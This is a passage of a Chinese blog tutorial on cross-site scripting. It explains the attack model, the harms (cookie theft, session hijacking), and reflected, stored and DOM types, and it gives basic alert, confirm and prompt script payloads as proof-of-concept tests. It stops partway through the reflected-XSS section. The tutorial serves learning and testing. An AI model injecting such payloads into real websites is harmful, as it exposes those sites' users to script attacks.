<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>xss | cgjil</title><meta name="author" content="cgjil"><meta name="copyright" content="cgjil"><meta name="referrer" content="no-referrer"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="xss"><meta name="application-name" content="xss"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="xss"><meta property="og:url" content="http://example.com/2022/11/08/%E6%BC%8F%E6%B4%9E/xss/index.html"><meta property="og:site_name" content="cgjil"><meta property="og:description" content="1.跨站脚本攻击1.1  漏洞概述​		跨站点脚本（Cross Site Scripting， XSS）是指通过利用网页开发遗留下俩的漏洞，在客户端代码注入攻击，攻击者可以在合法网站或Web 应用程序中执行恶意脚本。当web 应用程序在其生成的输出中使用未经验证或未编码的用户输入时，就会发生XSS。"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="http://example.com/image/12.webp"><meta property="article:author" content="cgjil"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="http://example.com/image/12.webp"><meta name="description" content="1.跨站脚本攻击1.1  漏洞概述​		跨站点脚本（Cross Site Scripting， XSS）是指通过利用网页开发遗留下俩的漏洞，在客户端代码注入攻击，攻击者可以在合法网站或Web 应用程序中执行恶意脚本。当web 应用程序在其生成的输出中使用未经验证或未编码的用户输入时，就会发生XSS。"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://example.com/2022/11/08/%E6%BC%8F%E6%B4%9E/xss/"><link rel="preconnect" href="//npm.elemecdn.com"/><link rel="preconnect" href="//npm.onmicrosoft.cn"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/@fortawesome/fontawesome-free@6.4.0/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.20/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3G1uPFWikrp3ggY5","LingQueMonitorID":"3G1uPFWikrp3ggY5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":["🏃 脚踏实地行动派"]},
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: cgjil","link":"链接: ","source":"来源: cgjil","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'cgjil',
  title: 'xss',
  postAI: '',
  pageFillDescription: '1.跨站脚本攻击, 1.1  漏洞概述, 1.2 XSS 漏洞原理, 1.2.1  攻击模型, 1.3 XSS 漏洞危害, 1.4 XSS 漏洞验证, 1.5  XSS 漏洞分类, 1.5.1  反射型XSS, 1.5.2  存储型XSS, 1.5.3DOM型XSS, 2.XSS 攻防案例, 2.1  固定会话, 2.1.1  原理, 2.1.2  xss平台, 2.1.3  窃取, 2.1.4  欺骗, 2.1.5  影响, 2.1.6  防御, 3.XSS 攻防, 3.1 XSS 构造方法, 3.1.1  利用ltgt, 3.1.2  javascript 伪协议, 3.1.4  其他标签, 3.1.5  参考, 3.2 XSS 变形方式, 3.2.1大小写转换, 3.2.2  关键字双写, 3.2.3  对伪协议进行转码, 3.2.4  插入其他字符, 3.2.5  引号的使用, 3.2.6  x2F 代替空格, 3.2.7  拆分跨站, 3.3 XSS 的防御, 3.3.1  输入过滤, 3.3.2  输出编码, 3.3.3  黑白名单策略, 3.3.4  防御DOM型XSS, 3.3.5  终极测试代码跨站脚本攻击漏洞概述跨站点脚本是指通过利用网页开发遗留下俩的漏洞在客户端代码注入攻击攻击者可以在合法网站或应用程序中执行恶意脚本当应用程序在其生成的输出中使用未经验证或未编码的用户输入时就会发生跨站脚本攻击由于与重名所以就更名为作为内容之一主要使用来完成恶意攻击的行为可以非常灵活的操纵浏览器这就使得攻击想象空间非常大也就是说强大的灵活性和功能为攻击提供了非常广阔的攻击面漏洞原理攻击模型通过将精心构造的代码注入到网页中并由浏览器解释运行这段代码以达到恶意攻击的效果当用户访问被脚本注入过的网页脚本就会被提取出来用户浏览器就会解析执行这段代码也就是说用户被攻击了整个攻击过程涉及三个角色服务器攻击者客户端浏览器用户前端注意搜索框登录框微博留言板聊天室等等收集用户输入的地方都有可能被注入代码都存在遭受的风险等待受害者访问被注入恶意代码的页面很被动盲打攻击目标是客户端浏览器用户由于浏览器的类别不同攻击效果不同甚至于同一款浏览器攻击效果都不一样漏洞危害是利用代码实现攻击有很多危害盗取各种用户账号窃取用户资料冒充用户身份进入网站劫持用户会话执行任意操作刷流量执行弹窗广告传播蠕虫病毒漏洞验证可以使用一段简单的代码验证和检测漏洞的存在这样的代码叫做验证漏洞存在的如下如果页面弹窗浏览器把用户提交的字符串当做来执行并且执行成功说明漏洞存在漏洞分类反射型非持久型存储型型反射型非持久性参数型的跨站脚本反射型的代码在应用的参数中例如搜索框的反射型注意到反射型代码出现在参数中容易被发现利用难度高很多漏洞提交平台不收反射型漏洞存储型持久性跨站脚本持久性体现在代码不是在某个参数变量中而是写进数据库或文件等可以永久保存数据的介质中存储型通常发生在留言板等地方可以在留言板位置进行留言将恶意代码写进数据库中危害面比较广漏洞提交平台会接收此类漏洞型型是一种攻击其中攻击的代码是由于修改受害者浏览器页面的树而执行的特殊的地方就是攻击代码在浏览器本地修改树而执行并不会将上传到服务器这也使得型比较难以检测注意修改树执行采用号的方式参数不会提交到服务器攻防案例固定会话原理用户会话令牌利用来实现的是存储在浏览器端的一小段文本相当于身份证会有窃取和欺骗的风险可以利用攻击窃取到浏览器里的信息由于触发需要浏览器客户端用户受害者参与攻击者不清楚何时何地会触发漏洞这个过程一般被成为盲打平台窃取欺骗影响黑客可以利用信息也就是身份凭据登录后台即使管理员注销登录会话依然有效即使管理员修改了密码会话依然有效防御根据实际情况采用单点登录采用机制设置值对数据设置属性攻防构造方法利用伪协议可以通过载入资源的标签攻击的是浏览器受前端影响比较大浏览器的类型版本等因素都会影响的效果事件响应事件驱动是一种比较典型的编程思想事件类型说明事件对对象触发的事件事件表单内触发的事件事件键盘事件事件鼠标事件事件由多媒体触发的事件其他标签参考变形方式网站搜索框存在反射性漏洞如下尝试在代码角度对漏洞进行修复修改文件对进行过滤代码如下大小写转换关键字双写绕过一次过滤对伪协议进行转码编码字母码十进制编码十六进制编码插入其他字符可以将以下字符插入到任意位置字符编码字符编码换行回车将以下字符插入到头部位置引号的使用语言对引号的使用要求不严格某些过滤函数是锱铢必较没有引号单引号双引号代替空格拆分跨站将一段代码拆成多段的防御过滤器的作用是过滤用户浏览器客户端提交的有害信息从而达到防范攻击的效果输入过滤永远不要相信用户的输入输入验证对用户提交的信息进行有效性验证仅接受指定长度仅包含合法字符输出编码编码是实体编码黑白名单策略不管是采用输入过滤还是输出编码都是针对用户提交的信息进行黑白名单式的过滤黑名单非允许的内容白名单允许的内容防御型避免客户端文档重写重定向或其他敏感操作终极测试代码',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-11-08 20:47:54',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://hbimg.huaban.com/535ad5a8d0a1762fc1cbe65f6e7748d373a8c57d7bfa-l5D3wU_fw658"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">cgjil</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button only-home" id="travellings_button" title="随机前往一个开往项目网站"><a class="site-page" onclick="anzhiyu.totraveling()" title="随机前往一个开往项目网站" href="javascript:void(0);" rel="external nofollow" data-pjax-state="external"><i class="anzhiyufont anzhiyu-icon-train"></i></a></div><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/Linux/" style="font-size: 1.05rem;">Linux<sup>3</sup></a><a href="/tags/Windows/" style="font-size: 1.05rem;">Windows<sup>4</sup></a><a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size: 1.05rem;">脚本<sup>1</sup></a><a href="/tags/%E8%AF%AD%E8%A8%80/" style="font-size: 1.05rem;">语言<sup>6</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/11/"><span class="card-archive-list-date">十一月 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/10/"><span class="card-archive-list-date">十月 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/09/"><span class="card-archive-list-date">九月 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/08/"><span class="card-archive-list-date">八月 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/07/"><span class="card-archive-list-date">七月 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/06/"><span class="card-archive-list-date">六月 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item on" id="consoleCommentBarrage" onclick="anzhiyu.switchCommentBarrage()" title="热评开关"><a class="commentBarrage"><i class="anzhiyufont anzhiyu-icon-message"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%BC%8F%E6%B4%9E/" itemprop="url">漏洞</a></span><span class="article-meta tags"></span></div></div><h1 class="post-title" itemprop="name headline">xss</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2022-11-08T12:47:54.000Z" title="发表于 2022-11-08 20:47:54">2022-11-08</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2022-11-08T12:47:54.000Z" title="更新于 2022-11-08 20:47:54">2022-11-08</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">2.5k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>10分钟</span></span><span class="post-meta-separator"></span><span id="" data-flag-title="xss"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span class="waline-pageview-count" data-path="/2022/11/08/%E6%BC%8F%E6%B4%9E/xss/" title="访问量"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2022/11/08/%E6%BC%8F%E6%B4%9E/xss/#post-comment"><span class="waline-comment-count" data-path="/2022/11/08/%E6%BC%8F%E6%B4%9E/xss/"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><article class="post-content" id="article-container" itemscope itemtype="http://example.com/2022/11/08/%E6%BC%8F%E6%B4%9E/xss/"><header><a class="post-meta-categories" href="/categories/%E6%BC%8F%E6%B4%9E/" itemprop="url">漏洞</a><h1 id="CrawlerTitle" itemprop="name headline">xss</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">cgjil</span><time itemprop="dateCreated datePublished" datetime="2022-11-08T12:47:54.000Z" title="发表于 2022-11-08 20:47:54">2022-11-08</time><time itemprop="dateCreated datePublished" datetime="2022-11-08T12:47:54.000Z" title="更新于 2022-11-08 20:47:54">2022-11-08</time></header><h2 id="1-跨站脚本攻击"><a href="#1-跨站脚本攻击" class="headerlink" title="1.跨站脚本攻击"></a>1.跨站脚本攻击</h2><h3 id="1-1-漏洞概述"><a href="#1-1-漏洞概述" class="headerlink" title="1.1  漏洞概述"></a><strong>1.1</strong>  漏洞概述</h3><p>​		跨站点脚本（Cross Site Scripting， XSS）是指通过利用网页开发遗留下俩的漏洞，在客户端代码注入攻击，攻击者可以在合法网站或Web 应用程序中执行恶意脚本。当web 应用程序在其生成的输出中使用未经验证或未编码的用户输入时，就会发生XSS。</p>
<p>​		跨站脚本攻击，XSS (Cross Site Scripting)。由于与CSS (Cascading Style Sheet) 重名，所以就更名为XSS。</p>
<p>​		XSS 作为OWASP TOP 10（2017）内容之一，主要使用JavaSript 来完成恶意攻击的行为，JS 可以非常灵活的操纵HTML、CSS、浏览器，这就使得XSS 攻击“想象”空间非常大。也就是说，JS 强大的灵活性和功能，为XSS 攻击提供了非常广阔的攻击面。</p>
<h3 id="1-2-XSS-漏洞原理"><a href="#1-2-XSS-漏洞原理" class="headerlink" title="1.2 XSS 漏洞原理"></a><strong>1.2</strong> <strong>XSS</strong> 漏洞原理</h3><h4 id="1-2-1-攻击模型"><a href="#1-2-1-攻击模型" class="headerlink" title="1.2.1  攻击模型"></a><strong>1.2.1</strong>  <strong>攻击模型</strong></h4><p>​		XSS 通过将精心构造的代码（JavaScript）注入到网页中，并由浏览器解释运行这段JS 代码，以达到恶意攻击的效果。当用户访问被XSS 脚本注入过的网页，XSS 脚本就会被提取出来，用户浏览器就会解析执行这段代码，也就是说用户被攻击了。整个XSS 攻击过程，涉及三个角色：</p>
<ul>
<li><p>服务器</p>
</li>
<li><p>攻击者</p>
</li>
<li><p>客户端浏览器用户（前端）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/clip_image029-1693013949472.gif" alt="img"></p>
</li>
</ul>
<p><strong>注意：</strong></p>
<ul>
<li><p>搜索框、登录框、微博、留言板、聊天室等等收集用户输入的地方，都有可能被注入XSS 代码，都存在遭受XSS 的风险。等待受害者访问被注入恶意代码的页面，很被动，盲打。</p>
</li>
<li><p>XSS 攻击目标是客户端浏览器用户，由于浏览器的类别不同，攻击效果不同，甚至于同一款浏览器，攻击效果都不一样。</p>
</li>
</ul>
<h3 id="1-3-XSS-漏洞危害"><a href="#1-3-XSS-漏洞危害" class="headerlink" title="1.3 XSS 漏洞危害"></a><strong>1.3</strong> <strong>XSS</strong> 漏洞危害</h3><blockquote>
<p>XSS 是利用JS 代码实现攻击，有很多危害：</p>
<ul>
<li><p>盗取各种用户账号；</p>
</li>
<li><p>窃取用户Cookie 资料，</p>
</li>
<li><p>冒充用户身份进入网站；</p>
</li>
<li><p>劫持用户会话执行任意操作；</p>
</li>
<li><p>刷流量，执行弹窗广告；</p>
</li>
<li><p>传播蠕虫病毒；</p>
</li>
</ul>
</blockquote>
<h3 id="1-4-XSS-漏洞验证"><a href="#1-4-XSS-漏洞验证" class="headerlink" title="1.4 XSS 漏洞验证"></a><strong>1.4</strong> <strong>XSS</strong> 漏洞验证</h3><p>可以使用一段简单的代码，验证和检测漏洞的存在，这样的代码叫做POC（Proof of Concept）。验证XSS 漏洞存在的POC 如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="regexp">/xss/</span>);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">confirm</span>(<span class="regexp">/xss/</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&#x27;xss&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">prompt</span>(<span class="string">&#x27;xss&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>如果页面弹窗，浏览器把用户提交的字符串当做JS 来执行，并且执行成功，说明XSS 漏洞存在。</p>
<h3 id="1-5-XSS-漏洞分类"><a href="#1-5-XSS-漏洞分类" class="headerlink" title="1.5  XSS 漏洞分类"></a><strong>1.5</strong>  <strong>XSS</strong> 漏洞分类</h3><ul>
<li><p>反射型XSS(非持久型)</p>
</li>
<li><p>存储型XSS </p>
</li>
<li><p>DOM 型XSS</p>
</li>
</ul>
<h4 id="1-5-1-反射型XSS"><a href="#1-5-1-反射型XSS" class="headerlink" title="1.5.1  反射型XSS"></a><strong>1.5.1</strong>  <strong>反射型</strong>XSS</h4><p>​		非持久性、参数型的跨站脚本。反射型XSS 的代码在Web 应用的参数中，例如搜索框的反射型XSS。</p>
